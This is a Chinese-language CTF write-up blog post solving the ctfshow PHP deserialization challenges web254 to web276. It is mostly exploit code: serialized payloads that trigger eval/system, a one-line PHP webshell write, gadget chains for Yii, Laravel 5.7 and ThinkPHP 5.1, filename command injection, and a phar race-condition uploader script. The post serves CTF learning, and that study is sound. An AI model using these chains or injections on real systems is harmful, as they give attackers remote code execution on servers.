---
title: ctfshow 反序列化题解
date: 2025-08-20 10:00:00
author: Xendr1a
categories: [CTF题解, ctfshow]
tags: [ctfshow, 反序列化]
description: ctfshow 反序列化专题：魔术方法、字符串逃逸与 pop 链构造。
toc: true
---
## 反序列化

### web254

```text
<?php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

审计代码，就是说传入的值要与定义的值相同，然后就会让\$isVip=ture，输出flag

### web255

```text
<?php
class ctfShowUser{
public $isVip=true;
}

$a=new ctfShowUser();
echo urlencode(serialize($a));
```

### web256

多了一步对username和password的判断，要求不想等

```text
<?php
class ctfShowUser{
public $username='xxxxxx';
public $password='asdff';
public $isVip=true;
}

$a=new ctfShowUser();
echo urlencode(serialize($a));
```

### web257

首先找到能执行命令的函数，我们看到了eval()，我们需要调用他，那我们得调用backDoor，而这个

```text
   public function __construct(){
        $this->class=new info();
    }
```

是我们可控的，我们可以把其改成

```text
  public function __construct(){
        $this->class=new backDoor();
    }
```

然后给$code=`'system(&quot;tac f*&quot;);'`

那我们就可以得到

```text
<?php
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=true; //记得改为true
    private $class = 'info';

    public function __construct(){
        $this->class=new backDoor();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code='system("tac f*");';//执行命令
    public function getInfo(){
        eval($this->code);
    }
}

echo urlencode(serialize(new ctfShowUser()));
```

get传啥都行

### 或者

```text
class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new backDoor();  //将class设置为backDoor类的对象
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();  //这里调用的就是backDoor类的getInfo()方法了
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code = 'system("tac flag.php");'; //给code赋值为我们要执行的代码
    public function getInfo(){
        eval($this->code);
    }
}

$user = new ctfShowUser();
echo serialize($user);
echo urlencode(serialize($user));
```

### web258

加了一个过滤O:咱们用str_replace(）匹配改掉就ok

```text
<?php
class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
    public $class = 'backDoor';

    public function __construct(){
        $this->class=new backDoor();
    }

}

class backDoor{
    public $code="system('cat flag.php');";
    public function getInfo(){
        eval($this->code);
    }
}
$a = new ctfShowUser();
$a = serialize($a);
$a= str_replace('O:', 'O:+',$a);//绕过preg_match
echo urlencode($a);
```

这里解释一下为什么加个+号，因为0:后面跟着的是数字，+就代表正数，就是没改变其意思

### web259

```text

```

### web260

```text
payload：?ctfshow=ctfshow_i_love_36D  #只要有这个ctfshow_i_love_36D就行
```

### web261

```text
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

因为在php7.4以上如果出现反序列化这个方法会自动绕过weekup，所以用到的就是

```text
   public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
```

和一个弱比较，code=0x36D=877

```text
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
```

众所周知弱类型比较加字母不影响，那我们可以构造877.php，那我们加一句话木马也是ok的

```text
<?php
class ctfshowvip
{
    public $username;
    public $password;
    public $code;
 
    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
    }
}
$a = new ctfshowvip('877.php',"<?php system('tac /f*');?>");
echo serialize($a);
```

### web262

字符串逃逸，hint在message.php中

```text
<?php
class message {
    public $from;
    public $msg;
    public $to;
    public $token = 'user';

    public function __construct($f, $m, $t) {
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

function filter($a) {
    return str_replace('fuck', 'loveU', $a);
}

$msg = new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"admin";}', 'b', 'c');
$msg_1=serialize($msg);
$msg_2=filter($msg_1);
echo base64_encode($msg_2);

//O:7:"message":4:{s:4:"from";s:4:"loveU";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}
//O:7:"message":4:{s:4:"from";s:4:"fuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
//O:7:"message":4:{s:4:"from";s:310:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"admin";}";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}
```

理论上应该可行但是会报错？为啥

### web263

### web264

和262差不多，可以拿来练习一下

```text
<?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token='admin';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

function filter($msg)
{
    return str_replace('fuck', 'loveU', $msg);
}

$msg=new message('a','b','fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}');
$msg_1=serialize($msg);
$msg_2=filter($msg_1);
echo $msg_2;

//O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}
//O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:4:"fuck";s:5:"token";s:5:"admin";}
//O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:4:"loveU";s:5:"token";s:5:"admin";}
//O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:135:"fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}";s:5:"token";s:5:"admin";}
//O:7:"message":4:{s:4:"from";s:1:"a";s:3:"msg";s:1:"b";s:2:"to";s:135:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";s:5:"token";s:5:"admin";}
```

### web265

```text
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

让token全等于password，这边用指针赋值

```text
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$a=new ctfshowAdmin('a','b');
$a->password=&$a->token;
echo urlencode(serialize($a));
```

### web266

```text
include('flag.php');
$cs = file_get_contents('php://input');

class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

主要就是要绕过正则匹配，出异常就不能销毁了，就触发不了`__destruct()`

```text
payload：O:7:"ctfshow":2:{}
类名存在但是里面的反序列化失败依旧会执行__destruct()这个销毁方法，需要在bp上提交hackbar试了不行
还有一种方法是可以大小写绕过，因为PHP不区分大小写
O:7:"Ctfshow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
```

### web267

Yii反序列化漏洞

```text
<?php

namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'highlight_file';
            $this->id = '/flag';				//命令执行
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}
```

其他可以使用的有

```text
shell_exec("cat /flag | tee 1");
passthru("tac /flag");
highlight_file("/flag");
```

### web268

换了个链子，上题的命令还能用

```text
<?php

namespace Faker;
class DefaultGenerator{
    protected $default ;
    function __construct($argv)
    {
        $this->default = $argv;
    }
}

class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($command,$argv)
    {
        $this->generator = new DefaultGenerator($argv);
        $this->validator = $command;
        $this->maxRetries = 99999999;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes = [];
    function __construct($command,$argv)
    {
        $this->processes[] = new ValidGenerator($command,$argv);
    }
}

$exp = new RunProcess('shell_exec','cat /flags | tee 1');
echo(base64_encode(serialize($exp)));
```

### web269

上题的能用

```text
<?php

namespace Faker;
class DefaultGenerator{
    protected $default ;
    function __construct($argv)
    {
        $this->default = $argv;
    }
}

class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($command,$argv)
    {
        $this->generator = new DefaultGenerator($argv);
        $this->validator = $command;
        $this->maxRetries = 99999999;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes = [];
    function __construct($command,$argv)
    {
        $this->processes[] = new ValidGenerator($command,$argv);
    }
}

$exp = new RunProcess('highlight_file','/flagsa');
echo(base64_encode(serialize($exp)));
```

### web270

```text
<?php

namespace Faker;
class DefaultGenerator{
    protected $default ;
    function __construct($argv)
    {
        $this->default = $argv;
    }
}

class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($command,$argv)
    {
        $this->generator = new DefaultGenerator($argv);
        $this->validator = $command;
        $this->maxRetries = 99999999;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes = [];
    function __construct($command,$argv)
    {
        $this->processes[] = new ValidGenerator($command,$argv);
    }
}

$exp = new RunProcess('shell_exec','tac /flagsaa | tee 1');
echo(base64_encode(serialize($exp)));
```

还是能用。。。

### web271

Laravel v5.7反序列化漏洞

```text
<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;
        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}
namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}
namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;
        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}
namespace{
    $genericuser = new Illuminate\Auth\GenericUser(
        array(
            "expectedOutput"=>array("0"=>"1"),
            "expectedQuestions"=>array("0"=>"1")
             )
    );
    $application = new Illuminate\Foundation\Application(
        array(
            "Illuminate\Contracts\Console\Kernel"=>
                array(
                    "concrete"=>"Illuminate\Foundation\Application"
                     )
             )
    );
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
        "system",array('cat /flag'),
        $genericuser,
        $application
    );
    echo urlencode(serialize($pendingcommand));
}
?>
```

### web272

也是Laravel反序列化漏洞，换个链子

```text
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;
        public function __construct(){
            $this->connection=new MockDefinition();
        }
    }
}
namespace Illuminate\Bus{

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;
        public function __construct(){
            $this->queueResolver=[new EvalLoader(),'load'];
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader
    {

    }
}
namespace Mockery\Generator{
    class MockConfiguration
    {
        protected $name="feng";
    }
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php system('cat /flag');exit()?>";
            $this->config=new MockConfiguration();
        }
    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}
```

### web273

上题的还能用

### web274

```text
ThinkPHP5.1反序列化漏洞
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'Xendria'=>new Request()
            );
            $this->append=array(
                'Xendria'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}

#data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo3OiJYZW5kcmlhIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo3OiJYZW5kcmlhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==&Xendria=cat /flag
```

## web275

```text
怪题
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
```

我们先分析一下毫无疑问__construct和__destruct必定会被触发，fn控制filename的值，然后只要有php或者flag就会让evilfile=true;

我们可以直接闭合RCE？

```text
GET :
?fn=php;ls
system('rm php;ls');
?fn=php;tac flag.php
system('rm php;tac flag.php');
```

### web276

```text
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-08 19:13:36
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-08 20:08:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }
    
}else{
    echo 'where is flag?';
}
#与上题比较多了一个phar
```

因为我们无法控制admin，所以这下我们需要用另外的方法了

我们可以利用`unlink(_SERVER['DOCUMENT_ROOT'].'/'._GET['fn']);`，他会销毁filename文件，我们自然而然地想到Phar协议解析文件时,会自动触发对manifest字段的序列化字符串进行反序列化，那我们可以根据这个东西写一个phar

```text
<?php

highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=true;
    public $admin = true;

    public function __construct($f='',$fn=''){
        $this->filename='1;tac fla?.ph?';
        $this->filecontent='';
    }
}

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$o=new filter();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

然后把文件写进去

```text
import threading
import requests

url = "http://e474da8b-d7ec-4090-92a9-26547ad646f8.challenge.ctf.show/"
content = open("web276.phar", "rb").read()
found_flag = False

def upload():
    requests.post(url=url + "?fn=web276.phar", data=content)

def read():
    global found_flag
    response = requests.post(url=url + "?fn=phar://web276.phar/", data="1")
    if "ctfshow{" in response.text or "flag{" in response.text:
        print(response.text)
        found_flag = True

while not found_flag:
    threading.Thread(target=upload).start()
    threading.Thread(target=read).start()
#至于为什么用条件竞争，因为会删除filename的缘故，我们需要在删除前访问phar，才能保证反序列化的有效进行
```
